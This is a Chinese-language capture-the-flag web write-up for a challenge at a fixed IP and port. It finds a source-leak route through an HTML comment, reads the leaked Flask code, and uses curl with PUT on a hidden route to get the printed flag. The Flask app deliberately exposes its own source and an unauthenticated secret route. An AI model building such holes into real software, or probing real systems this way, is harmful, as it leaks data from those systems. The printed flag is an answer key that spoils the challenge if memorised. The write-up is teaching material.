# CTF Web Writeup: Hidden Route Discovery

## 题目信息
- **目标URL**: http://49.232.142.230:19534/
- **题目类型**: Web - 源码审计 / 隐藏路由发现

---

## 解题过程

### Step 1: 信息收集

访问目标URL，获取首页HTML源码：

```bash
curl -v http://49.232.142.230:19534/
```

**响应头关键信息：**
```
Server: gunicorn
Content-Type: text/html; charset=utf-8
```

**页面内容：**
```html
<!DOCTYPE html>
<html>
<head>
<title>index</title>
<script>
  function start() {
    alert("where's the flag? i swear it was around here somewhere");
  }
</script>
</head>
<body>
<button onclick='start()'>click me for the flag</button>
<!-- /src -->
</body>
</html>
```

### Step 2: 发现关键线索

页面中有一个按钮，点击后弹出一个误导性的alert消息，这是典型的**红鲱鱼**（误导线索）。

真正的线索隐藏在HTML注释中：
```html
<!-- /src -->
```

### Step 3: 获取源代码

访问 `/src` 路径：

```bash
curl http://49.232.142.230:19534/src
```

获取到Flask应用源码 `app.py`：

```python
import flask

app = flask.Flask(__name__)

@app.route('/', methods=['GET'])
def index():
  return flask.send_file('index.html')

@app.route('/src', methods=['GET'])
def source():
  return flask.send_file('app.py')

@app.route('/super-secret-route-nobody-will-guess', methods=['PUT'])
def flag():
  return open('flag').read()
```

### Step 4: 源码分析

从源码中发现隐藏路由：

| 路由 | 方法 | 功能 |
|------|------|------|
| `/` | GET | 返回首页 |
| `/src` | GET | 返回源代码 |
| `/super-secret-route-nobody-will-guess` | **PUT** | 读取并返回flag |

**关键发现：** 存在一个隐藏路由 `/super-secret-route-nobody-will-guess`，且只接受 **PUT** 请求方法。

### Step 5: 获取Flag

使用PUT方法访问隐藏路由：

```bash
curl -X PUT http://49.232.142.230:19534/super-secret-route-nobody-will-guess
```

成功获取Flag：

```
wctf{y0u_h4v3_b33n_my_fr13nd___th4t_1n_1t53lf_1s_4_tr3m3nd0u5_th1ng}
```

## 知识点总结

1. **HTML注释泄露敏感信息** - 开发者经常在注释中留下调试信息或路径线索
2. **HTTP方法限制绕过** - 只检查GET/POST而忽略PUT/DELETE等方法是常见漏洞
3. **源码泄露** - `/src`、`/source`、`.git`、备份文件等都是常见的源码泄露点
4. **红鲱鱼识别** - 页面上的明显交互元素可能是故意设计的干扰项
